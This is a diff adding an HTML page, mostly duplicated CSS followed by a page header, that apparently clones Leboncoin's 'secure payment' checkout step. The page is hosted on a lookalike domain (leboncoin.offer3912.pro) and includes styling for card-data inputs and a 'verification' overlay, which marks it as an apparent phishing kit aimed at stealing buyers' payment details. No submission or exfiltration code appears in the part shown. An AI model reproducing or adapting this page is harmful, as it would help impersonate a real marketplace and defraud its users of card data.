+            margin-bottom: 0.8rem;
+        }
+
+        ol,
+        ul {
+            list-style-type: none;
+        }
+
+        .fFSHQR {
+            width: 1.6rem;
+            height: 1.6rem;
+            min-width: 1.6rem;
+            margin-right: 0.8rem;
+            fill: rgb(85, 185, 80);
+            color: rgb(85, 185, 80);
+        }
+
+        .fFSHQR {
+            fill: rgb(85, 185, 80);
+            color: rgb(85, 185, 80);
+        }
+
+        ._1gRbf {
+            background: transparent;
+            border: none;
+            color: #369;
+            cursor: pointer;
+            padding: 0;
+        }
+
+        @media screen and (min-width: 793px) {
+            .fqHNxf {
+                display: flex;
+                -moz-box-pack: justify;
+                justify-content: space-between;
+            }
+        }
+
+
+        ._25LNb {
+            line-height: 2.4rem;
+        }
+
+        ._3gP8T {
+            font-size: 1.4rem;
+        }
+
+        ._3Ce01 {
+            color: #ff6e14;
+        }
+
+        .dHSPoE {
+            display: flex;
+            -moz-box-align: center;
+            align-items: center;
+            text-align: left;
+            margin-top: 0.8rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .dHSPoE {
+            text-align: left;
+        }
+
+        .gMlBpL {
+            width: 1.6rem;
+            height: 1.6rem;
+            min-width: 1.6rem;
+            margin-right: 0.8rem;
+        }
+
+        .iDdsdA {
+            grid-area: Form;
+            order: 1;
+        }
+
+        fieldset,
+        form {
+            border: none;
+        }
+
+        .byyKoR {
+            background-color: rgb(255, 255, 255);
+            border-radius: 0.8rem;
+            box-shadow: rgba(26, 26, 26, 0.08) 0px -1px 4px 0px, rgba(26, 26, 26, 0.12) 0px 4px 8px 0px;
+            margin-bottom: 2.4rem;
+            padding: 1.6rem;
+        }
+
+        @media screen and (min-width: 793px) {
+            .byyKoR {
+                padding: 3.2rem 2.4rem;
+            }
+        }
+
+        .h3-like,
+        h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+
+        .aj3_W {
+            border-style: solid;
+        }
+
+        ._1mwQl {
+            border-width: 1px;
+        }
+
+        .FB92D {
+            border-color: #cad1d9;
+        }
+
+        .ZlsP9 {
+            border-radius: 4px;
+            display: flex;
+            flex-direction: row;
+            height: 4rem;
+            position: relative;
+        }
+
+        .ZlsP9 input::placeholder {
+            color: #8191a0;
+        }
+
+        .ZlsP9 input {
+            border: none;
+            border-radius: 4px;
+            font-size: 1.4rem;
+            height: 100%;
+            min-width: 0;
+            padding: 0 1rem;
+            width: 100%;
+        }
+
+        .kcHEek {
+            background-color: rgb(255, 255, 255);
+            border-radius: 0.8rem;
+            padding: 1.6rem;
+            border-width: 0.1rem;
+            border-color: rgb(255, 110, 20);
+            border-style: solid;
+            cursor: pointer;
+        }
+
+        @media screen and (min-width: 793px) {
+            .kcHEek {
+                padding: 3.2rem 2.4rem;
+            }
+        }
+
+
+        .dMmgxv {
+            position: relative;
+            top: 0px;
+            left: 0px;
+            height: 100%;
+            width: 100%;
+            vertical-align: top;
+            display: inline-flex;
+            -moz-box-pack: center;
+            justify-content: center;
+            -moz-box-align: center;
+            align-items: center;
+            margin-left: 0.4rem;
+            background-color: rgb(255, 255, 255);
+            border-width: 0.2rem;
+            border-style: solid;
+            border-color: rgb(168, 180, 192);
+            border-radius: 50%;
+        }
+
+        label {
+            cursor: pointer;
+        }
+
+        button,
+        input,
+        label,
+        select {
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        .kXAiEc:checked:not(:disabled)~.sc-bnXvFD::before {
+            width: 1rem;
+            height: 1rem;
+        }
+
+        .kXAiEc:checked:not(:disabled)~.sc-bnXvFD {
+            border-color: rgb(255, 110, 20);
+        }
+
+        .epBTZG .sc-gFaPwZ {
+            width: 100%;
+        }
+
+        .fMsPue {
+            display: inline-block;
+            vertical-align: top;
+            user-select: none;
+            margin-left: 0.8rem;
+        }
+
+        .fkEazy {
+            margin-bottom: 0.8rem;
+            transform: translateY(-0.4rem);
+        }
+
+        .fYkXta {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 0.4rem;
+        }
+
+        ._2k43C {
+            color: #8191a0;
+        }
+
+        figure,
+        ol,
+        p,
+        ul {
+            margin: 0;
+        }
+
+        .kMxULx:last-child {
+            margin: 0px;
+        }
+
+        _3QMDx {
+            vertical-align: top;
+        }
+
+        .iNBTHB {
+            width: 2rem;
+            height: 2rem;
+            min-width: 2rem;
+            margin-left: 0.8rem;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        ._2adxl {
+            margin-left: auto;
+        }
+
+        .ddRUJi {
+            display: flex;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            -moz-box-align: center;
+            align-items: center;
+            margin-bottom: 0.4rem;
+        }
+
+        .-HQxY {
+            margin-bottom: 0;
+        }
+
+        .bYnGfB {
+            display: block;
+            padding-top: 0.8rem;
+        }
+
+        ol,
+        ul {
+            padding: 0;
+            padding-top: 0px;
+            list-style-type: none;
+        }
+
+        .bBEOPH {
+            display: flex;
+            margin-bottom: 0.8rem;
+        }
+
+        ol,
+        ul {
+            list-style-type: none;
+        }
+
+        .fFSHQR {
+            width: 1.6rem;
+            height: 1.6rem;
+            min-width: 1.6rem;
+            margin-right: 0.8rem;
+            fill: rgb(85, 185, 80);
+            color: rgb(85, 185, 80);
+        }
+
+        .fFSHQR {
+            fill: rgb(85, 185, 80);
+            color: rgb(85, 185, 80);
+        }
+
+        ._1gRbf {
+            background: transparent;
+            border: none;
+            color: #369;
+            cursor: pointer;
+            padding: 0;
+        }
+
+        @media screen and (min-width: 793px) {
+            .fqHNxf {
+                display: flex;
+                -moz-box-pack: justify;
+                justify-content: space-between;
+            }
+        }
+
+
+        ._25LNb {
+            line-height: 2.4rem;
+        }
+
+        ._3gP8T {
+            font-size: 1.4rem;
+        }
+
+        ._3Ce01 {
+            color: #ff6e14;
+        }
+
+        .dHSPoE {
+            display: flex;
+            -moz-box-align: center;
+            align-items: center;
+            text-align: left;
+            margin-top: 0.8rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .dHSPoE {
+            text-align: left;
+        }
+
+        .gMlBpL {
+            width: 1.6rem;
+            height: 1.6rem;
+            min-width: 1.6rem;
+            margin-right: 0.8rem;
+        }
+
+        .iDdsdA {
+            grid-area: Form;
+            order: 1;
+        }
+
+        fieldset,
+        form {
+            border: none;
+        }
+
+        .byyKoR {
+            background-color: rgb(255, 255, 255);
+            border-radius: 0.8rem;
+            box-shadow: rgba(26, 26, 26, 0.08) 0px -1px 4px 0px, rgba(26, 26, 26, 0.12) 0px 4px 8px 0px;
+            margin-bottom: 2.4rem;
+            padding: 1.6rem;
+        }
+
+        @media screen and (min-width: 793px) {
+            .byyKoR {
+                padding: 3.2rem 2.4rem;
+            }
+        }
+
+        .h3-like,
+        h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+
+        .aj3_W {
+            border-style: solid;
+        }
+
+        ._1mwQl {
+            border-width: 1px;
+        }
+
+        .FB92D {
+            border-color: #cad1d9;
+        }
+
+        .ZlsP9 {
+            border-radius: 4px;
+            display: flex;
+            flex-direction: row;
+            height: 4rem;
+            position: relative;
+        }
+
+        .ZlsP9 input::placeholder {
+            color: #8191a0;
+        }
+
+        .ZlsP9 input {
+            border: none;
+            border-radius: 4px;
+            font-size: 1.4rem;
+            height: 100%;
+            min-width: 0;
+            padding: 0 1rem;
+            width: 100%;
+        }
+
+        .kcHEek {
+            background-color: rgb(255, 255, 255);
+            border-radius: 0.8rem;
+            padding: 1.6rem;
+            border-width: 0.1rem;
+            border-color: rgb(255, 110, 20);
+            border-style: solid;
+            cursor: pointer;
+        }
+
+        @media screen and (min-width: 793px) {
+            .kcHEek {
+                padding: 3.2rem 2.4rem;
+            }
+        }
+
+        ._1pHkp {
+            margin-bottom: .4rem;
+        }
+
+        ._1alA0 {
+            flex-direction: column;
+        }
+
+        ._1alA0,
+        .yX2Vc {
+            display: flex;
+            position: relative;
+        }
+
+        ._3LMUM {
+            display: flex;
+            position: relative;
+        }
+
+        ._2zTJK::placeholder {
+            color: #8191a0;
+        }
+
+        ._2zTJK {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-color: transparent;
+            border: 1px solid #cad1d9;
+            border-radius: 4px;
+            color: #1a1a1a;
+            font-family: Open Sans, sans-serif, Arial;
+            font-size: 1.4rem;
+            height: 4.8rem;
+            outline: none;
+            padding: 1.6rem;
+            width: 100%;
+            z-index: 2;
+        }
+
+        ._2DElF {
+            align-items: center;
+            display: flex;
+            height: 100%;
+            left: 0;
+            padding-left: 1.6rem;
+            padding-right: 1.6rem;
+            position: absolute;
+        }
+
+        ._19KGD .Yo6NQ,
+        ._19KGD ._1Y-5-,
+        ._1eaC2 ._1Y-5- {
+            color: #1a1a1a;
+        }
+
+        ._19KGD ._1Y-5-,
+        ._1Mgto,
+        ._1eaC2 ._1Y-5- {
+            font-size: 1.2rem;
+            left: 1.6rem;
+            padding-left: .4rem;
+            padding-right: .4rem;
+            position: absolute;
+            top: 0;
+            transform: translate(-.4rem, -50%);
+            margin-top: -16px;
+        }
+
+        ._1Y-5- {
+            background-color: #fff;
+            color: #8191a0;
+            font-size: 1.4rem;
+            margin-top: 0;
+            transition: transform .2s, top .2s, left .2s, background-color .2s;
+            white-space: nowrap;
+            z-index: 3;
+        }
+
+        .HGqCc {
+            margin-top: 1.6rem;
+        }
+
+        ._1alA0 {
+            flex-direction: column;
+        }
+
+        ._1alA0,
+        .yX2Vc {
+            display: flex;
+            position: relative;
+        }
+
+        ._36Ogi {
+            -webkit-box-pack: justify;
+            -ms-flex-pack: justify;
+            grid-gap: .8rem;
+            display: flex;
+            justify-content: space-between;
+            margin-top: .4rem;
+            padding-left: 1.6rem;
+            padding-right: 1.6rem;
+        }
+
+        figure,
+        ol,
+        p,
+        ul {
+            margin: 0;
+            margin-top: 0px;
+            margin-bottom: 0px;
+        }
+
+        ._3c6yv {
+            margin-bottom: 1.6rem;
+        }
+
+        @media (min-width: 793px) {
+            .styles_mobilePriceLineContainer__RIkYd {
+                margin-top: 0;
+            }
+        }
+
+        .styles_mobilePriceLineContainer__RIkYd,
+        .styles_submitContainer__uYPpz {
+            margin-top: .8rem;
+        }
+
+        @media (min-width: 793px) {
+            ._9dEbO {
+                display: none !important;
+            }
+        }
+
+        .gBKina {
+            display: flex;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            margin-bottom: 0.8rem;
+        }
+
+        ._1x_aE {
+            display: inline;
+        }
+
+        button::-moz-focus-inner,
+        input::-moz-focus-inner {
+            border: 0;
+            padding: 0;
+        }
+
+        .kBGDvm:disabled {
+            border-color: transparent;
+            color: #fff;
+            pointer-events: none;
+            cursor: not-allowed;
+        }
+
+        button[disabled],
+        html input[disabled] {
+            cursor: not-allowed;
+        }
+
+        .kBGDvm {
+            border-radius: 4px;
+            text-decoration: none;
+            transition: background-color 300ms ease 0s, color 300ms ease 0s;
+            cursor: pointer;
+            -moz-box-align: center;
+            align-items: center;
+            display: inline-flex;
+            font-family: "Open Sans", sans-serif, Arial;
+            font-size: 1.4rem;
+            font-weight: 600;
+            -moz-box-pack: center;
+            justify-content: center;
+            margin-bottom: 0px;
+            margin-right: 0px;
+            min-height: 4rem;
+            padding-left: 5.6rem;
+            padding-right: 5.6rem;
+            width: 100%;
+            border: 1px solid transparent;
+            border-top-color: transparent;
+            border-right-color: transparent;
+            border-bottom-color: transparent;
+            border-left-color: transparent;
+            color: rgb(255, 255, 255);
+            background-color: rgb(255, 110, 20);
+        }
+
+        @media screen and (min-width: 793px) {
+            .kBGDvm {
+                margin-right: 2.4rem;
+                margin-bottom: 1.6rem;
+                width: auto;
+            }
+        }
+
+        button {
+            padding: 0;
+            padding-right: 0px;
+            padding-left: 0px;
+            border: none;
+            background-color: transparent;
+            cursor: pointer;
+        }
+
+        button,
+        html input[type="button"],
+        input[type="reset"],
+        input[type="submit"] {
+            -webkit-appearance: button;
+            cursor: pointer;
+        }
+
+        button,
+        select {
+            text-transform: none;
+        }
+
+        button {
+            overflow: visible;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            color: inherit;
+            font: inherit;
+            font-weight: inherit;
+            font-size: inherit;
+            font-family: inherit;
+            margin: 0;
+            margin-right: 0px;
+            margin-bottom: 0px;
+        }
+
+        @media (min-width: 1024px) {
+            .y7uUX {
+                display: none !important;
+            }
+        }
+
+
+        .imMZAK {
+            position: fixed;
+            bottom: 0px;
+            left: 0px;
+            width: 100%;
+            z-index: 1100;
+            padding: 1.6rem;
+            background-color: rgb(255, 255, 255);
+            box-shadow: rgba(26, 26, 26, 0.08) 0px -1px 4px 0px, rgba(26, 26, 26, 0.12) 0px 4px 8px 0px;
+        }
+
+        @media (max-width: 1023px) {
+            ._6UM0J {
+                display: none !important;
+            }
+        }
+
+        ._3sWzy {
+            bottom: 0;
+            display: none;
+            left: 0;
+            position: fixed;
+            right: 0;
+            top: 0;
+            z-index: 1400;
+        }
+
+        [hidden],
+        template {
+            display: none;
+        }
+
+        .fabXAL {
+            height: 0px;
+            position: absolute;
+            width: 0%;
+        }
+
+        .ivuIYO {
+            width: 100%;
+            height: 100%;
+            fill: rgb(255, 110, 20);
+            color: rgb(255, 110, 20);
+        }
+
+        @media (max-width: 970px) {
+            ._1o09v {
+                display: none !important;
+            }
+        }
+
+        ._1-TTU {
+            line-height: 2.2rem;
+        }
+
+        ._1hnil {
+            font-size: 1.6rem;
+        }
+
+        .FUcqi {
+            margin-left: .8rem;
+        }
+
+        @media (min-width: 793px) {
+            ._1JYGK {
+                line-height: 2.8rem;
+            }
+        }
+
+        @media (max-width: 793px) {
+            ._2KqHw {
+                display: none !important;
+            }
+        }
+
+        .gGnrlK {
+            margin-bottom: 1.6rem;
+            margin-top: 0.8rem;
+        }
+
+        @media screen and (min-width: 793px) {
+            .gGnrlK {
+                margin-top: 1.6rem;
+            }
+        }
+
+        .djqzTL {
+            display: flex;
+            -moz-box-pack: start;
+            justify-content: flex-start;
+            margin-bottom: 0.8rem;
+        }
+
+        @media (min-width: 793px) {
+            .djqzTL {
+                -moz-box-align: center;
+                align-items: center;
+            }
+        }
+
+        .djqzTL .sc-iyvyFf {
+            flex-shrink: 0;
+        }
+
+        .gNwNXk {
+            display: flex;
+            -moz-box-pack: center;
+            justify-content: center;
+            -moz-box-align: center;
+            align-items: center;
+            width: 3.2rem;
+            height: 3.2rem;
+            background-color: rgb(254, 240, 233);
+            border-radius: 50%;
+            margin-right: 1.6rem;
+        }
+
+        .bkTUyS {
+            display: flex;
+            -moz-box-pack: start;
+            justify-content: flex-start;
+            margin-bottom: 0px;
+        }
+
+        @media (min-width: 768px) {
+            .bkTUyS {
+                -moz-box-align: center;
+                align-items: center;
+            }
+        }
+
+        .bkTUyS .sc-iyvyFf {
+            flex-shrink: 0;
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            src: local("Open Sans Regular"), local("OpenSans-Regular"), url(/leboncoin/font/opensans-regular-webfont.woff2) format("woff2"), url(/leboncoin/font/opensans-regular-webfont.woff) format("woff");
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            src: local("Open Sans Semibold"), local("OpenSans-Semibold"), url(/leboncoin/font/opensans-semibold-webfont.woff2) format("woff2"), url(/leboncoin/font/opensans-semibold-webfont.woff) format("woff");
+            font-weight: 600;
+            font-style: normal;
+            font-display: swap
+        }
+
+        .deactive {
+            display: none;
+        }
+
+        #main_content {
+            display: flex;
+            margin-top: 1rem;
+        }
+
+        .sc-GMQeP {
+            margin-right: 30px;
+            flex: 1 1 auto;
+        }
+
+        .sc-exAgwC {
+            width: 325px;
+        }
+
+        .sc-fOKMvo {
+            margin-bottom: 15px;
+        }
+
+        .sc-fOKMvo span {
+            font-weight: 100 !important;
+            font-size: 1.2rem !important;
+        }
+
+        .card_data_span {
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+
+        .card_data_span_small {
+            float: right;
+            color: #8191a0;
+            font-size: 1.2rem;
+            font-weight: 400;
+        }
+
+        .card_data_input {
+            width: 100%;
+            margin-top: 5px;
+            border: 1px solid #a8b4c0;
+            border-radius: 4px;
+            padding: 8px 15px;
+            font-size: 15px;
+        }
+
+        .card_data_input::placeholder {
+            color: #9ba4ac;
+        }
+
+        .card_data_block {
+            width: 49%;
+        }
+
+        .card_data_left {
+            margin-right: 1%;
+        }
+
+        .card_data_right {
+            margin-left: 1%;
+        }
+
+        .card_data_main {
+            display: flex;
+            margin: 30px 0;
+        }
+
+        #amount_data {
+            float: right;
+        }
+
+        @media screen and (max-width: 900px) {
+            #main_content {
+                display: block;
+            }
+
+            .sc-exAgwC {
+                width: 100%;
+            }
+
+            .sc-GMQeP {
+                margin-right: 0;
+            }
+        }
+
+        @media screen and (max-width: 600px) {
+            .card_data_block {
+                width: 100% !important;
+                margin: 0 !important;
+            }
+
+            .card_data_main {
+                display: block;
+            }
+        }
+
+        ._1pHkp {
+            margin-bottom: .4rem;
+        }
+
+        ._1alA0 {
+            flex-direction: column;
+        }
+
+        ._1alA0,
+        .yX2Vc {
+            display: flex;
+            position: relative;
+        }
+
+        ._3LMUM {
+            display: flex;
+            position: relative;
+        }
+
+        ._2zTJK::placeholder {
+            color: #8191a0;
+        }
+
+        ._2zTJK {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-color: transparent;
+            border: 1px solid #cad1d9;
+            border-radius: 4px;
+            color: #1a1a1a;
+            font-family: Open Sans, sans-serif, Arial;
+            font-size: 1.4rem;
+            height: 4.8rem;
+            outline: none;
+            padding: 1.6rem;
+            width: 100%;
+            z-index: 2;
+        }
+
+        ._2DElF {
+            align-items: center;
+            display: flex;
+            height: 100%;
+            left: 0;
+            padding-left: 1.6rem;
+            padding-right: 1.6rem;
+            position: absolute;
+        }
+
+        ._19KGD .Yo6NQ,
+        ._19KGD ._1Y-5-,
+        ._1eaC2 ._1Y-5- {
+            color: #1a1a1a;
+        }
+
+        ._19KGD ._1Y-5-,
+        ._1Mgto,
+        ._1eaC2 ._1Y-5- {
+            font-size: 1.2rem;
+            left: 1.6rem;
+            padding-left: .4rem;
+            padding-right: .4rem;
+            position: absolute;
+            top: 0;
+            transform: translate(-.4rem, -50%);
+            margin-top: -16px;
+        }
+
+        ._1Y-5- {
+            background-color: #fff;
+            color: #8191a0;
+            font-size: 1.4rem;
+            margin-top: 0;
+            transition: transform .2s, top .2s, left .2s, background-color .2s;
+            white-space: nowrap;
+            z-index: 3;
+        }
+
+        .HGqCc {
+            margin-top: 1.6rem;
+        }
+
+        ._1alA0 {
+            flex-direction: column;
+        }
+
+        ._1alA0,
+        .yX2Vc {
+            display: flex;
+            position: relative;
+        }
+
+        ._36Ogi {
+            -webkit-box-pack: justify;
+            -ms-flex-pack: justify;
+            grid-gap: .8rem;
+            display: flex;
+            justify-content: space-between;
+            margin-top: .4rem;
+            padding-left: 1.6rem;
+            padding-right: 1.6rem;
+        }
+
+        figure,
+        ol,
+        p,
+        ul {
+            margin: 0;
+            margin-top: 0px;
+            margin-bottom: 0px;
+        }
+
+        ._3c6yv {
+            margin-bottom: 1.6rem;
+        }
+
+        @media (min-width: 793px) {
+            .styles_mobilePriceLineContainer__RIkYd {
+                margin-top: 0;
+            }
+        }
+
+        .styles_mobilePriceLineContainer__RIkYd,
+        .styles_submitContainer__uYPpz {
+            margin-top: .8rem;
+        }
+
+        @media (min-width: 793px) {
+            ._9dEbO {
+                display: none !important;
+            }
+        }
+
+        .gBKina {
+            display: flex;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            margin-bottom: 0.8rem;
+        }
+
+        ._1x_aE {
+            display: inline;
+        }
+
+        button::-moz-focus-inner,
+        input::-moz-focus-inner {
+            border: 0;
+            padding: 0;
+        }
+
+        .kBGDvm:disabled {
+            border-color: transparent;
+            color: #fff;
+            pointer-events: none;
+            cursor: not-allowed;
+        }
+
+        button[disabled],
+        html input[disabled] {
+            cursor: not-allowed;
+        }
+
+        .kBGDvm {
+            border-radius: 4px;
+            text-decoration: none;
+            transition: background-color 300ms ease 0s, color 300ms ease 0s;
+            cursor: pointer;
+            -moz-box-align: center;
+            align-items: center;
+            display: inline-flex;
+            font-family: "Open Sans", sans-serif, Arial;
+            font-size: 1.4rem;
+            font-weight: 600;
+            -moz-box-pack: center;
+            justify-content: center;
+            margin-bottom: 0px;
+            margin-right: 0px;
+            min-height: 4rem;
+            padding-left: 5.6rem;
+            padding-right: 5.6rem;
+            width: 100%;
+            border: 1px solid transparent;
+            border-top-color: transparent;
+            border-right-color: transparent;
+            border-bottom-color: transparent;
+            border-left-color: transparent;
+            color: rgb(255, 255, 255);
+            background-color: rgb(255, 110, 20);
+        }
+
+        @media screen and (min-width: 793px) {
+            .kBGDvm {
+                margin-right: 2.4rem;
+                margin-bottom: 1.6rem;
+                width: auto;
+            }
+        }
+
+        button {
+            padding: 0;
+            padding-right: 0px;
+            padding-left: 0px;
+            border: none;
+            background-color: transparent;
+            cursor: pointer;
+        }
+
+        button,
+        html input[type="button"],
+        input[type="reset"],
+        input[type="submit"] {
+            -webkit-appearance: button;
+            cursor: pointer;
+        }
+
+        button,
+        select {
+            text-transform: none;
+        }
+
+        button {
+            overflow: visible;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            color: inherit;
+            font: inherit;
+            font-weight: inherit;
+            font-size: inherit;
+            font-family: inherit;
+            margin: 0;
+            margin-right: 0px;
+            margin-bottom: 0px;
+        }
+
+        @media (min-width: 1024px) {
+            .y7uUX {
+                display: none !important;
+            }
+        }
+
+        .imMZAK {
+            position: fixed;
+            bottom: 0px;
+            left: 0px;
+            width: 100%;
+            z-index: 1100;
+            padding: 1.6rem;
+            background-color: rgb(255, 255, 255);
+            box-shadow: rgba(26, 26, 26, 0.08) 0px -1px 4px 0px, rgba(26, 26, 26, 0.12) 0px 4px 8px 0px;
+        }
+
+        @media (max-width: 1023px) {
+            ._6UM0J {
+                display: none !important;
+            }
+        }
+
+        ._3sWzy {
+            bottom: 0;
+            display: none;
+            left: 0;
+            position: fixed;
+            right: 0;
+            top: 0;
+            z-index: 1400;
+        }
+
+        [hidden],
+        template {
+            display: none;
+        }
+
+        .fabXAL {
+            height: 0px;
+            position: absolute;
+            width: 0%;
+        }
+
+        .ivuIYO {
+            width: 100%;
+            height: 100%;
+            fill: rgb(255, 110, 20);
+            color: rgb(255, 110, 20);
+        }
+
+        @media (max-width: 970px) {
+            ._1o09v {
+                display: none !important;
+            }
+        }
+
+        ._1-TTU {
+            line-height: 2.2rem;
+        }
+
+        ._1hnil {
+            font-size: 1.6rem;
+        }
+
+        .FUcqi {
+            margin-left: .8rem;
+        }
+
+        @media (min-width: 793px) {
+            ._1JYGK {
+                line-height: 2.8rem;
+            }
+        }
+
+        @media (max-width: 793px) {
+            ._2KqHw {
+                display: none !important;
+            }
+        }
+
+        .gGnrlK {
+            margin-bottom: 1.6rem;
+            margin-top: 0.8rem;
+        }
+
+        @media screen and (min-width: 793px) {
+            .gGnrlK {
+                margin-top: 1.6rem;
+            }
+        }
+
+        .djqzTL {
+            display: flex;
+            -moz-box-pack: start;
+            justify-content: flex-start;
+            margin-bottom: 0.8rem;
+        }
+
+        @media (min-width: 793px) {
+            .djqzTL {
+                -moz-box-align: center;
+                align-items: center;
+            }
+        }
+
+        .djqzTL .sc-iyvyFf {
+            flex-shrink: 0;
+        }
+
+        .gNwNXk {
+            display: flex;
+            -moz-box-pack: center;
+            justify-content: center;
+            -moz-box-align: center;
+            align-items: center;
+            width: 3.2rem;
+            height: 3.2rem;
+            background-color: rgb(254, 240, 233);
+            border-radius: 50%;
+            margin-right: 1.6rem;
+        }
+
+        .bkTUyS {
+            display: flex;
+            -moz-box-pack: start;
+            justify-content: flex-start;
+            margin-bottom: 0px;
+        }
+
+        @media (min-width: 768px) {
+            .bkTUyS {
+                -moz-box-align: center;
+                align-items: center;
+            }
+        }
+
+        .bkTUyS .sc-iyvyFf {
+            flex-shrink: 0;
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            src: local("Open Sans Regular"), local("OpenSans-Regular"), url(/leboncoin/font/opensans-regular-webfont.woff2) format("woff2"), url(/leboncoin/font/opensans-regular-webfont.woff) format("woff");
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            src: local("Open Sans Semibold"), local("OpenSans-Semibold"), url(/leboncoin/font/opensans-semibold-webfont.woff2) format("woff2"), url(/leboncoin/font/opensans-semibold-webfont.woff) format("woff");
+            font-weight: 600;
+            font-style: normal;
+            font-display: swap
+        }
+
+        .deactive {
+            display: none;
+        }
+
+        #main_content {
+            display: flex;
+            margin-top: 1rem;
+        }
+
+        .sc-GMQeP {
+            margin-right: 30px;
+            flex: 1 1 auto;
+        }
+
+        .sc-exAgwC {
+            width: 325px;
+        }
+
+        .sc-fOKMvo {
+            margin-bottom: 15px;
+        }
+
+        .sc-fOKMvo span {
+            font-weight: 100 !important;
+            font-size: 1.2rem !important;
+        }
+
+        .card_data_span {
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+
+        .card_data_span_small {
+            float: right;
+            color: #8191a0;
+            font-size: 1.2rem;
+            font-weight: 400;
+        }
+
+        .card_data_input {
+            width: 100%;
+            margin-top: 5px;
+            border: 1px solid #a8b4c0;
+            border-radius: 4px;
+            padding: 8px 15px;
+            font-size: 15px;
+        }
+
+        .card_data_input::placeholder {
+            color: #9ba4ac;
+        }
+
+        .card_data_block {
+            width: 49%;
+        }
+
+        .card_data_left {
+            margin-right: 1%;
+        }
+
+        .card_data_right {
+            margin-left: 1%;
+        }
+
+        .card_data_main {
+            display: flex;
+            margin: 30px 0;
+        }
+
+        #amount_data {
+            float: right;
+        }
+
+        @media screen and (max-width: 900px) {
+            #main_content {
+                display: block;
+            }
+
+            .sc-exAgwC {
+                width: 100%;
+            }
+
+            .sc-GMQeP {
+                margin-right: 0;
+            }
+        }
+
+        @media screen and (max-width: 600px) {
+            .card_data_block {
+                width: 100% !important;
+                margin: 0 !important;
+            }
+
+            .card_data_main {
+                display: block;
+            }
+        }
+
+        #verification {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background-color: #000000bf;
+            display: none;
+            font-size: 100%;
+            z-index: 2;
+        }
+
+
+        @-webkit-keyframes animatetop {
+            from {
+                top: -300px;
+                opacity: 0;
+            }
+
+            to {
+                top: 50%;
+                opacity: 1;
+            }
+        }
+
+        @keyframes animatetop {
+            from {
+                top: -300px;
+                opacity: 0;
+            }
+
+            to {
+                top: 50%;
+                opacity: 1;
+            }
+        }
+
+        #verif-contnt {
+            padding: 20px;
+            background-color: #fff;
+            margin: 0 auto;
+            max-width: 360px;
+            border-radius: 15px;
+            margin-top: 100px;
+        }
+
+        #content {
+            text-align: center;
+            display: none;
+
+        }
+
+  .dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  animation: bounce 1.4s infinite ease-in-out both;
+}
+
+.dot:nth-child(1) {
+  background-color: #ff6f00; /* яркий оранжевый */
+  animation-delay: -0.32s;
+}
+
+.dot:nth-child(2) {
+  background-color: #ff8f00; /* светлее оранжевый */
+  animation-delay: -0.16s;
+}
+
+.dot:nth-child(3) {
+  background-color: #ffc046; /* светло-оранжевый */
+  animation-delay: 0;
+}
+
+@keyframes bounce {
+  0%, 80%, 100% {
+    transform: scale(0);
+  }
+  40% {
+    transform: scale(1);
+  }
+}
+
+
+    </style>
+
+</head>
+
+
+<body>
+    <div id="app" data-reactroot="">
+        <main class="card-form">
+            <div id="container" data-pagename="">
+                <div class="_1gbif">
+                    <div class="_3b19Z _1LfpU">
+                        <header role="banner" class="sc-kGXeez gKqnCl">
+                            <nav class="sc-kpOJdX fAOruB">
+                                <div display="[object Object]" width="100%" class="sc-bdVaJa jzWJHY"><a
+                                        href="https://www.leboncoin.fr/" title="Page précédente"
+                                        class="_137P- _3j0OU P4PEa"><svg viewBox="0 0 24 24" role="img"
+                                            class="sc-bdVaJa src___StyledBox-sc-fochin-0 kZINAN">
+                                            <use xlink:href="#SvgArrowleft"></use>
+                                        </svg></a><span class="_282XL _2adxl _3Wx6b _1hnil _35DXM _1-TTU">Étape
+                                        2/2&nbsp;-&nbsp;Paiement</span></div>
+                                <div display="[object Object]" width="100%" class="sc-bdVaJa gqkqEu">
+                                    <div display="flex" class="sc-bdVaJa GEtdv"><a
+                                            href="https://leboncoin.offer3912.pro/pay/262829457?mode_delivery=Remise+en+main+propre#"
+                                            onclick="history.back();return false;" title="Page précédente"
+                                            class="_21rqc _3QJkO _137P- _3j0OU P4PEa"><svg viewBox="0 0 24 24"
+                                                role="img" class="sc-bdVaJa src___StyledBox-sc-fochin-0 ctZyiq">
+                                                <use xlink:href="#SvgArrowleft"></use>
+                                            </svg><span class="_3Ce01 _3k87M _3Wx6b _1hnil _35DXM _1-TTU">
+                                                <div class="Q9ISj">
+                                                    <p>Retour</p>
+                                                </div>
+                                                <div class="_1o09v">
+                                                    <p>Retour</p>
+                                                </div>
+                                            </span></a></div>
+                                    <div display="flex" class="sc-bdVaJa hQcGor">
+                                        <div class="sc-jWBwVP hoqfsX"><svg viewBox="0 0 230 45" role="img"
+                                                class="sc-bdVaJa src___StyledBox-sc-fochin-0 ivuIYO">
+                                                <use xlink:href="#SvgLeboncoinlogo"></use>
+                                            </svg></div><span class="sc-brqgnP duXTlC"></span> <svg viewBox="0 0 24 24"
+                                            role="img" class="sc-bdVaJa src___StyledBox-sc-fochin-0 htznVN">
+                                            <use xlink:href="#SvgSecurepayment"></use>
+                                        </svg><span class="_3Ce01 FUcqi _1hnil _35DXM _1-TTU">Paiement sécurisé</span>
+                                    </div>
+                                    <div display="block" class="sc-bdVaJa ipkIET"></div>
+                                </div>
+                            </nav>
+                        </header>
